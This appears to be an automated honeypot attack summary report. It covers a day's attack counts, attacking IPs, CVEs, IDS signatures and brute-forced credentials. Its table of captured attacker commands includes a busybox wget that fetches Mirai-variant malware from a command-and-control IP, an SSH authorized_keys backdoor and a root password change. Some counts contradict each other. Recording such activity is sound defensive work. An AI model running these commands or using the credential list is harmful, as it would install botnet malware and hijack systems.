# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-01T15-59-41Z
**Timeframe:** 2025-10-01T04:01:55Z to 2025-10-01T15:52:57Z
**Files Analyzed:**
- Honeypot_Attack_Summary_Report_2025-10-01T15:52:57Z.md
- Honeypot_Attack_Summary_Report_2025-10-01T15:50:51Z.md
- Honeypot_Attack_Summary_Report_2025-10-01T15:48:16Z.md
- Honeypot_Attack_Summary_Report_2025-10-01T12:01:54Z.md
- Honeypot_Attack_Summary_Report_2025-10-01T11:03:16Z.md
- Honeypot_Attack_Summary_Report_2025-10-01T10:01:56Z.md
- Honeypot_Attack_Summary_Report_2025-10-01T09:02:18Z.md
- Honeypot_Attack_Summary_Report_2025-10-01T08:01:53Z.md
- Honeypot_Attack_Summary_Report_2025-10-01T07:02:20Z.md
- Honeypot_Attack_Summary_Report_2025-10-01T06:01:56Z.md
- Honeypot_Attack_Summary_Report_2025-10-01T05:01:50Z.md
- Honeypot_Attack_Summary_Report_2025-10-01T04:01:55Z.md

## Executive Summary

This report provides a comprehensive summary of malicious activities targeting our honeypot network over the past 12 hours. A significant volume of attacks were recorded, with a clear focus on exploiting common vulnerabilities and weak credentials. The Cowrie honeypot, simulating SSH and Telnet services, captured the majority of the attacks, indicating a high prevalence of brute-force and automated attacks.

The most aggressive attacks originated from a small number of IP addresses, with `161.35.152.121` (DigitalOcean, Netherlands), `92.205.59.208` (Host Europe GmbH, France), and `92.242.166.161` (SMARTNET LIMITED, Finland) being the most persistent. These IPs were responsible for a significant portion of the total attack volume, engaging in widespread scanning and brute-force attempts.

Attackers were observed attempting to deploy various malware families, most notably `urbotnetisass` (a Mirai variant) and `Mozi.m`, both of which target IoT devices. A common tactic involved the use of `wget` and `curl` to download these malicious payloads from a command-and-control server.

A number of unusual and targeted credential pairs were observed, including `345gs5662d34/345gs5662d34` (default credentials for Polycom VoIP phones) and `seekcy/Joysuch@Locate2024` (a known credential pair used in automated attacks). This highlights the continued threat of default and easily guessable passwords.

Furthermore, a significant number of alerts were triggered for the DoublePulsar backdoor, which is associated with the EternalBlue exploit. This indicates that attackers are still actively scanning for and attempting to exploit this critical vulnerability.

Overall, the threat landscape remains active and diverse, with a mix of automated, large-scale attacks and more targeted attempts to compromise systems. The findings in this report underscore the importance of strong password policies, regular patching, and robust network monitoring.

## Detailed Analysis

### Our IPs

| Honeypot | Private IP    | Public IP       |
| :--- | :--- | :--- |
| hive-us  | 10.128.0.3    | 34.123.129.205  |
| sens-tai | 10.140.0.3    | 104.199.212.115 |
| sens-tel | 10.208.0.3    | 34.165.197.224  |
| sens-dub | 172.31.36.128 | 3.253.97.195    |
| sens-ny  | 10.108.0.2    | 161.35.180.163  |

### Attacks by Honeypot

| Honeypot    | Attack Count |
| :--- | :--- |
| Cowrie      | 84,337       |
| Sentrypeer  | 34,940       |
| Honeytrap   | 20,925       |
| Dionaea     | 19,085       |
| Suricata    | 15,224       |
| Ciscoasa    | 12,028       |
| Mailoney    | 6,552        |
| Tanner      | 469          |
| H0neytr4p   | 454          |
| Redishoneypot | 338        |
| Adbhoney    | 244          |
| ConPot      | 256          |
| ElasticPot  | 136          |
| Honeyaml    | 135          |
| Dicompot    | 89           |
| Miniprint   | 144          |
| Heralding   | 9            |
| Ipphoney    | 23           |
| Wordpot     | 3            |

### Top Source Countries

| Country       | Attack Count |
| :--- | :--- |
| Netherlands   | 11,239       |
| France        | 12,245       |
| Finland       | 1,646        |
| United States | 5,031        |
| China         | 1,267        |
| Germany       | 822          |
| Brazil        | 682          |
| Russia        | 501          |
| India         | 476          |
| Vietnam       | 448          |

### Top Attacking IPs

| IP Address      | Attack Count |
| :--- | :--- |
| 161.35.152.121  | 11,239       |
| 92.205.59.208   | 17,400       |
| 92.242.166.161  | 1,646        |
| 15.235.37.85    | 5,031        |
| 129.212.183.91  | 1,494        |
| 103.130.215.15  | 1,267        |
| 45.134.26.20    | 1,000        |
| 138.68.167.183  | 989          |
| 86.54.42.238    | 821          |
| 45.140.17.144   | 823          |

### Top Targeted Ports/Protocols

| Port/Protocol | Attack Count |
| :--- | :--- |
| 5060          | 34,533       |
| 22            | 8,053        |
| 445           | 19,085       |
| 25            | 6,552        |
| 8333          | 1,030        |
| 3388          | 321          |
| 80            | 388          |
| 443           | 295          |
| 6379          | 294          |
| 23            | 381          |

### Most Common CVEs

| CVE               | Count |
| :--- | :--- |
| CVE-2002-0013     | 16    |
| CVE-2002-0012     | 16    |
| CVE-1999-0517     | 8     |
| CVE-2021-3449     | 8     |
| CVE-2019-11500    | 8     |
| CVE-2024-1709     | 6     |
| CVE-2024-4577     | 4     |
| CVE-2002-0953     | 4     |
| CVE-2023-26801    | 4     |
| CVE-2024-3721     | 4     |
| CVE-2001-0414     | 4     |
| CVE-2006-2369     | 3     |
| CVE-1999-0183     | 3     |
| CVE-2021-41773    | 2     |
| CVE-2021-42013    | 2     |
| CVE-2009-2765     | 2     |
| CVE-2016-6563     | 1     |
| CVE-2016-20016    | 1     |
| CVE-2021-35394    | 1     |
| CVE-2019-16920    | 1     |
| CVE-2024-12856    | 1     |
| CVE-2024-12885    | 1     |
| CVE-2014-6271     | 1     |
| CVE-2023-52163    | 1     |
| CVE-2023-47565    | 1     |
| CVE-2023-31983    | 1     |
| CVE-2024-10914    | 1     |
| CVE-2015-2051     | 1     |
| CVE-2024-33112    | 1     |
| CVE-2022-37056    | 1     |
| CVE-2019-10891    | 1     |
| CVE-2006-3602     | 1     |
| CVE-2006-4458     | 1     |
| CVE-2006-4542     | 1     |
| CVE-2005-4050     | 1     |

### Commands Attempted by Attackers

| Command                                                                                                                                                             |
| :--- |
| `cd ~; chattr -ia .ssh; lockr -ia .ssh`                                                                                                                              |
| `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ... mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`                                                 |
| `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...`                                                                                    |
| `uname -a`                                                                                                                                                          |
| `cat /proc/cpuinfo | grep name | wc -l`                                                                                                                              |
| `free -m | grep Mem`                                                                                                                                                  |
| `whoami`                                                                                                                                                            |
| `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh`                                                                                     |
| `Enter new UNIX password:`                                                                                                                                          |
| `echo "root:taY20v2QSxqf"|chpasswd|bash`                                                                                                                              |

### Signatures Triggered

| Signature                                                          |
| :--- |
| ET DROP Dshield Block Listed Source group 1                        |
| ET SCAN MS Terminal Server Traffic on Non-standard Port              |
| ET SCAN NMAP -sS window 1024                                       |
| ET HUNTING RDP Authentication Bypass Attempt                         |
| ET INFO Reserved Internal IP Traffic                               |
| ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication |
| ET VOIP REGISTER Message Flood UDP                                 |
| GPL TELNET Bad Login                                               |
| ET CINS Active Threat Intelligence Poor Reputation IP (various groups) |
| ET DROP Spamhaus DROP Listed Traffic Inbound (various groups)      |

### Users / Login Attempts

| Username/Password                        |
| :--- |
| 345gs5662d34/345gs5662d34              |
| root/nPSpP4PBW0                          |
| foundry/foundry                          |
| seekcy/Joysuch@Locate2024              |
| superadmin/admin123                      |
| gitlab/gitlab                            |
| test/zhbjETuyMffoL8F                     |
| ripple/ripple123                         |
| agent/agent                              |
| work/workwork                            |
| itsupport/itsupport123                   |
| user/user                                |
| ubuntu/ubuntu                            |
| titu/Ahgf3487@rtjhskl854hd47893@#a4nC  |
| mohammad/123                             |
| centos/centos                            |
| ftpuser/admin1234                        |
| lruiz/lruiz                              |
| geoserver/geoserver                      |
| alexis/alexis2024                        |

### Files Uploaded/Downloaded

| Filename            |
| :--- |
| sh                  |
| arm.urbotnetisass   |
| arm5.urbotnetisass  |
| arm6.urbotnetisass  |
| arm7.urbotnetisass  |
| mips.urbotnetisass  |
| mipsel.urbotnetisass|
| x86_32.urbotnetisass|
| Mozi.m              |
| wget.sh             |
| w.sh                |
| c.sh                |
| discovery           |
| soap-envelope       |
| rondo.dgx.sh        |
| apply.cgi           |
| welcome.jpg         |
| writing.jpg         |
| tags.jpg            |
| nse.html            |
| azenv.php           |

### HTTP User-Agents

| User-Agent                                                                      |
| :--- |
| Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36 |

### SSH Clients and Servers

*No specific SSH clients or server versions were logged in the provided data.*

### Top Attacker AS Organizations

*No specific AS organizations were logged in the provided data.*

## Google Searches

- OSINT report on IP address 161.35.152.121
- OSINT report on IP address 92.205.59.208
- OSINT report on IP address 92.242.166.161
- Information on "urbotnetisass" malware
- Information on "Mozi.m" malware
- Threat intelligence on username "345gs5662d34"
- Threat intelligence on username "seekcy" and password "Joysuch@Locate2024"

## Key Observations and Anomalies

- **Hyper-Aggressive IPs:**
    - `161.35.152.121`: Hosted by DigitalOcean in the Netherlands, this IP has been identified as a source of SSH brute-force attacks. It is listed on multiple threat intelligence platforms.
    - `92.205.59.208`: Hosted by Host Europe GmbH in France, this IP has been flagged for malicious activity, with its associated ASN linked to other threats.
    - `92.242.166.161`: Hosted by SMARTNET LIMITED in Finland, this IP is on several blacklists for spamming and other network abuses.
- **Targeted Usernames and Passwords:**
    - `345gs5662d34/345gs5662d34`: These are the default credentials for Polycom CX600 IP telephones, indicating that attackers are specifically targeting these devices.
    - `seekcy/Joysuch@Locate2024`: This credential pair is associated with automated SSH brute-force attacks, likely originating from a compromised wordlist.
- **Attacker Signatures:**
    - A recurring command sequence involves adding an SSH key with the comment "mdrfckr" to the `authorized_keys` file. This is a clear signature of a specific attacker or group attempting to maintain persistent access.
- **Malware Campaigns:**
    - `urbotnetisass`: This malware, a variant of the Mirai botnet, is being actively distributed. Attackers are using a command-and-control server at `94.154.35.154` to download and execute the malware on compromised IoT devices.
    - `Mozi.m`: This is a powerful P2P botnet that targets a wide range of IoT devices. Although a takedown of the main botnet was reported in 2023, the presence of this malware suggests a possible resurgence or the use of its code by other actors.
- **DoublePulsar Backdoor:**
    - The high number of Suricata alerts for the DoublePulsar backdoor is a significant finding. This indicates that attackers are still actively scanning for and exploiting the EternalBlue vulnerability (MS17-010), which remains a major threat to unpatched systems.

This concludes the Honeypot Attack Summary Report.
